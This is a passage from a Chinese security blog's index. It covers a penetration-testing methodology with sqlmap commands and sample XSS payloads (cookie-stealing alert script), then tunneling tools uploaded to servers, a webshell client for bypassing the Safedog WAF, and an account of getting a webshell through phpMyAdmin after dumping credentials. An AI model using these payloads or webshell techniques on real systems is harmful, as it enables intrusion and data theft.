    <url>%2F2018%2F03%2F%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[信息收集1、服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）2、网站指纹识别（包括，cms，cdn，证书等），dns记录3、whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）4、子域名收集，旁站查询(有授权可渗透)，C段等5、google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等6、扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等7、传输协议，通用漏洞，exp，github源码等 漏洞挖掘1、浏览网站，看看网站规模，功能，特点等2、端口，弱口令，目录等扫描3、XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等 漏洞利用 | 权限提升SQL注入，XSS，CSRF等SQL注入原理1、SQL（结构化语句查询）2、提交参数（调用数据库查询）的地方是用户可控的，并未做任何过滤处理3、分 数字型，字符型，搜索型，POST注入，Cookie注入，延时注入，盲注等SQL注入，注入方法1、如果是get型号，直接，sqlmap-u “注入点URL”2、如果是post型诸如点，可以sqlmap-u “注入点URL” –data=”post的参数”3、如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用 * 号替换，放到文件里，然后sqlmap -r “文件地址”XSS原理网站未对用户输入的数据做过滤处理，构造特定的JS脚本插入到文本框可引发XSS，会被浏览器解析，执行XSS常见攻击语句12345"&gt;&lt;BODY&gt;&lt;""&gt;&lt;svg /onload=prompt(1)&gt;&lt;""&gt;&lt;IMG SRC="javascript:alert('XSS');"&gt;&lt;""&gt;&lt;img src=" "=" "onerror="alert('xss')"&gt;&lt;""&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;" mysql提权，serv-u提权，linux内核版本提权等清除测试数据 | 输出报告1、日志、测试数据的清理2、总结，输出渗透测试报告，附修复方案 复测1、验证并发现是否有新漏洞，输出报告，归档 网络安全事件应急响应1、取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件 - 注意文件的时间，用户，后缀等属性），调取日志（系统日志，中间件日志，WAF日 志等）；2、处理，恢复备份（快照回滚，最近一次），确定入侵方法（漏洞检测，并进行修复）3、溯源，查入侵IP，入侵手法（网路攻击事件）的确定等4、记录，归档—-预防-事件检测-抑制-根除-恢复-跟踪-记录]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>Webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络代理工具]]></title>
    <url>%2F2018%2F03%2F%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[windows、linux代理Earthworm是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。下载地址：http://rootkiter.com/EarthWorm/使用Proxifier配合简单完成。Proxifier使用教程：https://jingyan.baidu.com/article/48b558e35e12f97f38c09a28.html现在可以上Google了。 socks5代理这个代理更好用，需要Python执行环境。上传Python脚本到服务器。s5.py下载地址：https://github.com/alone5xiao/hamal.cc执行命令：1Python /var/www/html/s5.py 8082 使用Proxifier代理成功。]]></content>
      <categories>
        <category>网络代理</category>
      </categories>
      <tags>
        <tag>网络代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页过狗一句话客户端]]></title>
    <url>%2F2018%2F02%2F%E7%BD%91%E9%A1%B5%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%AE%A2%E6%88%B7%E7%AB%AF%2F</url>
    <content type="text"><![CDATA[在很多网站都有安全狗，用菜刀连接总是失败。。用网页一句话客户端绕过安全狗拦截。下载地址：https://github.com/alone5xiao/hamal.cc]]></content>
      <categories>
        <category>一句话木马</category>
      </categories>
      <tags>
        <tag>一句话木马</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[拿Webshell小技巧]]></title>
    <url>%2F2018%2F02%2F%E6%8B%BFWebshell%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[用sqlmap注入拿到root账号密码，想用phpmyadmin写入一句话拿shell的时候，没有绝对路径。。就没有办法写入sehll。用工具扫描子域名，尝试用子网站拿shell，结果扫出来，还找到phpmyadmin，用爆出来的账号密码登录，登录成功。。用google搜索一波,拿到绝对路径现在有绝对路径，可以写入shell了。还是system权限，不错不错。。。]]></content>
      <categories>
        <category>Webshell</category>
      </categories>
      <tags>
        <tag>Webshell</tag>
      </tags>
  </entry>
</search>
